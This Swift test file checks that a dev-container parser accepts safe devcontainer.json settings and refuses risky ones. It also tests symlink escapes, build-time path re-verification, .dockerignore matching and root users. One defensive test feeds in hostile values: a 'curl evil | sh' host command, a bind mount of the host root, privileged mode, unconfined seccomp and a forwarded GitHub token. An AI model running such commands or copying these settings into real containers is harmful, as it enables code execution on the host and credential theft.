import Foundation
import Testing

@testable import ContainerKit

/// Dev containers: the safe subset is read; host commands, Features and privileges are refused with a reason.
@Suite("Dev containers")
struct DevContainerTests {
    let project = "/Users/me/Repos/app"

    func plan(_ text: String) -> DevContainerPlan {
        DevContainerPlan.parse(Data(text.utf8), file: project + "/.devcontainer/devcontainer.json", projectRoot: project)
    }

    @Test func imageEnvUserPortsAndLifecycleWithComments() {
        let result = plan("""
        // A typical file
        {
          "name": "app",
          "image": "mcr.microsoft.com/devcontainers/typescript-node:22", /* block comment */
          "workspaceFolder": "${localWorkspaceFolder}",
          "containerEnv": { "NODE_ENV": "development" },
          "remoteEnv": { "PATH_EXTRA": "/x" },
          "remoteUser": "node",
          "forwardPorts": [3000, 5173],
          "postCreateCommand": "npm ci",
          "postStartCommand": ["npm", "run", "dev's"],
          "customizations": { "vscode": { "extensions": ["dbaeumer.vscode-eslint"] } },
        }
        """)
        #expect(result.refused.isEmpty, "\(result.refused)")
        #expect(result.isUsable)
        #expect(result.image == "mcr.microsoft.com/devcontainers/typescript-node:22")
        #expect(result.containerEnv == ["NODE_ENV": "development"])
        #expect(result.remoteUser == "node")
        #expect(result.forwardPorts == [3000, 5173])
        #expect(result.postCreate == "npm ci")
        #expect(result.postStart == "'npm' 'run' 'dev'\\''s'")
        #expect(result.ignored == ["customizations", "name"])
        #expect(result.lifecycleDigest != nil)
    }

    /// A real temporary project (`/var/…`, itself reached through the /var → /private/var link) with a Dockerfile.
    func temporaryProject() throws -> (root: String, outside: String) {
        let base = NSTemporaryDirectory() + "bc-dev-\(UUID().uuidString.prefix(8))"
        let root = base + "/app"
        try FileManager.default.createDirectory(atPath: root + "/.devcontainer", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: base + "/outside", withIntermediateDirectories: true)
        try "FROM alpine\n".write(toFile: root + "/.devcontainer/Dockerfile", atomically: true, encoding: .utf8)
        try "FROM alpine\nCOPY id_rsa /\n".write(toFile: base + "/outside/Dockerfile", atomically: true, encoding: .utf8)
        return (root, base + "/outside")
    }

    func plan(_ text: String, root: String) -> DevContainerPlan {
        DevContainerPlan.parse(Data(text.utf8), file: root + "/.devcontainer/devcontainer.json", projectRoot: root)
    }

    @Test func buildIsResolvedInsideTheProject() throws {
        let (root, outsideFolder) = try temporaryProject()
        defer { try? FileManager.default.removeItem(atPath: (root as NSString).deletingLastPathComponent) }
        let result = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "..", "args": {"VARIANT": "22"}, "target": "dev"}}"#, root: root)
        #expect(result.isUsable, "\(result.refused)")
        #expect(result.build?.dockerfile == root + "/.devcontainer/Dockerfile")
        #expect(result.build?.context == root, "lexical: a leading /private or /var is kept as written")
        let argv = result.buildArguments(tag: "bellocode-dev-k:1", context: "/canonical/app") ?? []
        #expect(argv.starts(with: ["buildx", "build", "--load"]))
        #expect(argv.contains("VARIANT=22") && argv.last == "/canonical/app")
        #expect(argv.firstIndex(of: "-f").map { argv[$0 + 1] } == "-", "the Dockerfile comes on standard input")
        let outside = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "../../.."}}"#, root: root)
        #expect(outside.refused.map(\.key) == ["build.context"])
        _ = outsideFolder
    }

    /// R16: containment is decided on resolved paths, not by the path's spelling.
    @Test func linksUnderTheProjectThatPointOutsideAreRefused() throws {
        let (root, outside) = try temporaryProject()
        defer { try? FileManager.default.removeItem(atPath: (root as NSString).deletingLastPathComponent) }
        try FileManager.default.createSymbolicLink(atPath: root + "/linked", withDestinationPath: outside)
        try FileManager.default.createSymbolicLink(atPath: root + "/.devcontainer/Linked.Dockerfile", withDestinationPath: outside + "/Dockerfile")
        let linkedContext = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "../linked"}}"#, root: root)
        #expect(linkedContext.refused.map(\.key) == ["build.context"], "\(linkedContext.refused)")
        let linkedFile = plan(#"{"build": {"dockerfile": "Linked.Dockerfile", "context": ".."}}"#, root: root)
        #expect(linkedFile.refused.map(\.key) == ["build.context"], "\(linkedFile.refused)")
    }

    /// R16: a folder replaced by a link after the file was read is caught right before the build, and the CLI gets
    /// the verified canonical context and the Dockerfile's bytes, never a project path to open itself.
    @Test func inputsAreVerifiedAgainRightBeforeTheBuild() throws {
        let (root, outside) = try temporaryProject()
        defer { try? FileManager.default.removeItem(atPath: (root as NSString).deletingLastPathComponent) }
        try FileManager.default.createDirectory(atPath: root + "/ctx", withIntermediateDirectories: true)
        let result = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "../ctx"}}"#, root: root)
        let build = try #require(result.build)
        #expect(result.isUsable)
        let inputs = try DevContainerBuildInputs.verify(build, projectRoot: root).get()
        #expect(inputs.context == CodeRootPaths.canonical(root + "/ctx"))
        #expect(String(decoding: inputs.dockerfile, as: UTF8.self) == "FROM alpine\n")
        // Swapped for a link to a folder outside the project.
        try FileManager.default.removeItem(atPath: root + "/ctx")
        try FileManager.default.createSymbolicLink(atPath: root + "/ctx", withDestinationPath: outside)
        guard case .failure(let problem) = DevContainerBuildInputs.verify(build, projectRoot: root) else {
            Issue.record("a context swapped for an outside link was accepted")
            return
        }
        #expect(problem.description.contains("inside the project"))
        // The Dockerfile swapped for a link is refused as well.
        try FileManager.default.removeItem(atPath: root + "/ctx")
        try FileManager.default.createDirectory(atPath: root + "/ctx", withIntermediateDirectories: true)
        try FileManager.default.removeItem(atPath: root + "/.devcontainer/Dockerfile")
        try FileManager.default.createSymbolicLink(atPath: root + "/.devcontainer/Dockerfile", withDestinationPath: outside + "/Dockerfile")
        if case .success = DevContainerBuildInputs.verify(build, projectRoot: root) { Issue.record("a Dockerfile swapped for an outside link was accepted") }
    }

    /// R15: `.dockerignore` as Docker's CLI reads it.
    @Test func dockerignoreMatchesLikeTheCLI() {
        let ignore = DockerIgnore("""
            # comment
            node_modules
            **/*.log
            /build/
            docs/*.md
            !docs/README.md
            secret?.txt
            [ab].tmp
            """)
        #expect(ignore.ignores("node_modules") && ignore.ignores("node_modules/x/y.js"), "a folder covers what is in it")
        #expect(ignore.ignores("a.log") && ignore.ignores("deep/er/b.log"))
        #expect(ignore.ignores("build/out.o"))
        #expect(ignore.ignores("docs/guide.md") && !ignore.ignores("docs/README.md"), "the last matching pattern wins")
        #expect(!ignore.ignores("docs/sub/guide.md"), "* stays within one folder")
        #expect(ignore.ignores("secret1.txt") && !ignore.ignores("secret12.txt"))
        #expect(ignore.ignores("a.tmp") && !ignore.ignores("c.tmp"))
        #expect(!ignore.ignores("src/main.js") && !ignore.ignores("src/node_modules.txt"))
    }

    /// R15: the tag follows the content of what the context sends.
    @Test func theTagFollowsTheContextContent() throws {
        let (root, outside) = try temporaryProject()
        defer { try? FileManager.default.removeItem(atPath: (root as NSString).deletingLastPathComponent) }
        try FileManager.default.createDirectory(atPath: root + "/src", withIntermediateDirectories: true)
        try "a".write(toFile: root + "/src/a.txt", atomically: true, encoding: .utf8)
        try "tmp\n".write(toFile: root + "/.dockerignore", atomically: true, encoding: .utf8)
        let build = try #require(plan(#"{"build": {"dockerfile": "Dockerfile", "context": ".."}}"#, root: root).build)
        let cache = DevContextDigestCache()
        func tag() throws -> String { try DevContainerBuildInputs.verify(build, projectRoot: root).get().tag(projectKey: "k", build: build, cache: cache).get() }
        let first = try tag()
        #expect(first.hasPrefix("bellocode-dev-k:"))
        #expect(try tag() == first, "stable")
        try "b".write(toFile: root + "/src/a.txt", atomically: true, encoding: .utf8)
        let second = try tag()
        #expect(second != first, "a changed file changes the tag")
        try FileManager.default.createDirectory(atPath: root + "/tmp", withIntermediateDirectories: true)
        try "x".write(toFile: root + "/tmp/scratch", atomically: true, encoding: .utf8)
        #expect(try tag() == second, "an ignored file does not")
        // A link is hashed as a link: its target's contents are never read (and changing them changes nothing).
        try FileManager.default.createSymbolicLink(atPath: root + "/src/out", withDestinationPath: outside + "/Dockerfile")
        let linked = try tag()
        #expect(linked != second)
        try "FROM other\n".write(toFile: outside + "/Dockerfile", atomically: true, encoding: .utf8)
        #expect(try tag() == linked)
        // Same-size, same-second edits are still seen (the cache is keyed by inode, size and nanosecond times).
        try "c".write(toFile: root + "/src/a.txt", atomically: false, encoding: .utf8)
        #expect(try tag() != linked)
    }

    @Test func hostCommandsFeaturesAndPrivilegesAreRefusedWithReasons() {
        let result = plan("""
        {
          "image": "x", "initializeCommand": "curl evil | sh", "features": { "ghcr.io/devcontainers/features/node:1": {} },
          "privileged": true, "capAdd": ["SYS_PTRACE"], "runArgs": ["--network=host"], "mounts": ["source=/,target=/host,type=bind"],
          "securityOpt": ["seccomp=unconfined"], "workspaceFolder": "/workspace", "postAttachCommand": "x",
          "postCreateCommand": { "a": "x", "b": "y" }, "containerEnv": { "TOKEN": "${localEnv:GITHUB_TOKEN}" }
        }
        """)
        let keys = Set(result.refused.map(\.key))
        for key in ["initializeCommand", "features", "privileged", "capAdd", "runArgs", "mounts", "securityOpt", "workspaceFolder",
                    "postAttachCommand", "postCreateCommand", "containerEnv.TOKEN"] {
            #expect(keys.contains(key), "\(key) not refused")
        }
        #expect(!result.isUsable)
        #expect(result.refused.first { $0.key == "initializeCommand" }?.reason.contains("on this Mac") == true)
        // Empty or false values ask for nothing.
        #expect(plan(#"{"image": "x", "features": {}, "privileged": false, "runArgs": []}"#).refused.isEmpty)
    }

    @Test func invalidOrIncompleteFilesSaySo() {
        #expect(plan("{ not json").refused.first?.key == "(file)")
        #expect(plan(#"{"name": "x"}"#).refused.first?.key == "image")
        #expect(plan(#"{"dockerComposeFile": "compose.yaml", "service": "app"}"#).refused.contains { $0.key == "dockerComposeFile" })
    }

    @Test func commentsInsideStringsAreKept() {
        let data = DevContainerPlan.stripJSONC(Data(#"{"a": "http://x/*y*/", "b": [1,2,], // c"#.utf8) + Data("\n}".utf8))
        let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
        #expect(json?["a"] as? String == "http://x/*y*/")
        #expect((json?["b"] as? [Int]) == [1, 2])
    }

    /// N09: commands never run as root (the container's capabilities exist for BelloCode's own root step).
    @Test func aRootRemoteUserIsRefused() {
        for user in ["root", "0", "0:0", "root:wheel", " root ", "00"] {
            let result = plan(#"{"image": "x", "remoteUser": "\#(user)"}"#)
            #expect(result.refused.contains { $0.key == "remoteUser" }, "\(user)")
            #expect(result.remoteUser == nil)
        }
        for user in ["node", "vscode", "1000", "1000:1000", "rooted"] {
            #expect(plan(#"{"image": "x", "remoteUser": "\#(user)"}"#).remoteUser == user, "\(user)")
        }
        #expect(WorkspaceSpec(projectRoot: "/p", image: "x", user: "501:20").userIsNonRootByConstruction)
        #expect(!WorkspaceSpec(projectRoot: "/p", image: "x", user: "node").userIsNonRootByConstruction, "a name is checked in the container")
        #expect(!WorkspaceSpec(projectRoot: "/p", image: "x", user: "0:0").userIsNonRootByConstruction)
    }

    /// N09: under enforced egress the build's `RUN` steps get no network (BuildKit's builder cannot join the egress
    /// network; its default network would bypass the proxy).
    @Test func offlineBuildsHaveNoNetwork() throws {
        let result = plan(#"{"build": {"dockerfile": "Dockerfile"}}"#)
        let argv = try #require(result.buildArguments(tag: "t:1", context: "/c", offline: true))
        #expect(argv.firstIndex(of: "--network").map { argv[$0 + 1] } == "none")
        #expect(result.buildArguments(tag: "t:1", context: "/c")?.contains("--network") == false)
    }

    /// A18: the build gets a private copy of the context, hashed from the copy: saves after it was made change neither
    /// what is built nor the tag; the copy's digest equals the live context's digest when nothing changed.
    @Test func theStagedContextIsWhatIsHashedAndBuilt() throws {
        let (root, _) = try temporaryProject()
        defer { try? FileManager.default.removeItem(atPath: (root as NSString).deletingLastPathComponent) }
        try FileManager.default.createDirectory(atPath: root + "/src/node_modules", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: root + "/readonly", withIntermediateDirectories: true)
        try "a".write(toFile: root + "/src/a.txt", atomically: true, encoding: .utf8)
        try "x".write(toFile: root + "/src/node_modules/big.js", atomically: true, encoding: .utf8)
        try "keep".write(toFile: root + "/readonly/k.txt", atomically: true, encoding: .utf8)
        chmod(root + "/readonly", 0o555)
        defer { chmod(root + "/readonly", 0o755) }
        try "**/node_modules\n".write(toFile: root + "/.dockerignore", atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(atPath: root + "/src/link", withDestinationPath: "a.txt")
        let build = try #require(plan(#"{"build": {"dockerfile": "Dockerfile", "context": ".."}}"#, root: root).build)
        let inputs = try DevContainerBuildInputs.verify(build, projectRoot: root).get()
        let staged = try inputs.stage(projectRoot: root, parent: (root as NSString).deletingLastPathComponent).get()
        defer { chmod(staged.directory + "/readonly", 0o755); staged.remove() }
        #expect(!staged.directory.hasPrefix(root + "/"), "outside the project")
        let live = try DevContainerBuildInputs.contextDigest(inputs.context, cache: DevContextDigestCache()).get()
        #expect(staged.digest == live, "the copy hashes as the context")
        #expect(inputs.tag(projectKey: "k", build: build, contextDigest: staged.digest)
                == (try inputs.tag(projectKey: "k", build: build, cache: DevContextDigestCache()).get()))
        #expect(!FileManager.default.fileExists(atPath: staged.directory + "/src/node_modules/big.js"), "ignored files are not copied")
        #expect((try? FileManager.default.destinationOfSymbolicLink(atPath: staged.directory + "/src/link")) == "a.txt", "links stay links")
        // A save after staging: the copy (what the builder reads) and its digest are unchanged.
        try "b-changed".write(toFile: root + "/src/a.txt", atomically: false, encoding: .utf8)
        #expect((try? String(contentsOfFile: staged.directory + "/src/a.txt", encoding: .utf8)) == "a")
        #expect(try DevContainerBuildInputs.contextDigest(staged.directory, cache: DevContextDigestCache()).get() == staged.digest)
        #expect(try DevContainerBuildInputs.contextDigest(inputs.context, cache: DevContextDigestCache()).get() != staged.digest)
    }
}
